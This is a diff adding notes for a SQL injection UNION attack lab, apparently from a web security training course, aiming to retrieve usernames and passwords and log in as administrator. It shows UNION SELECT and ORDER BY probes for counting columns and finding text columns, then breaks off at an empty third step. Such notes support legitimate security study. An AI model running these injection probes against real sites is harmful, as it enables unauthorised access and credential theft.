@@ -1,0 +1,23 @@
+Lab #6: SQL injection UNION attack, retrieving multiple values in a single column 
+
+    Target Goal:
+         Retrieve all usernames and passwords and login as an administrator user
+
+    Analysis:
+
+       Step01: Finding the number of columns 
+
+        Type1:
+         SELECT * FROM table1 UNION SELECT null  (if error -> incorrect number of columns)
+         select * FROM table1 UNION SELECT null, null (if 200 response -> correct number of columns)
+        
+        Type2:
+          select * FROM table order by 1 (if not error -> column exists in table1)
+          select * FROM table order by 2 (if error -> column does not exist in table1)
+
+       Step02: Finding whether a column contains a text or not 
+
+         select * FROM table1 UNION SELECT 'a', null (if error -> Column does not contain a text)
+         select * FROM table1 UNION SELECT null, 'a' (if no error -> Column does contain a text)
+
+       Step03: 
